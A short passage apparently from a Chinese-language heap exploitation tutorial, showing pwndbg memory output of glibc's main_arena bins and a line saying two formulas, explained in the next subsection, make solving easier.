0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> 
```

记住两个公式解题更简单，下一小节将会讲解。

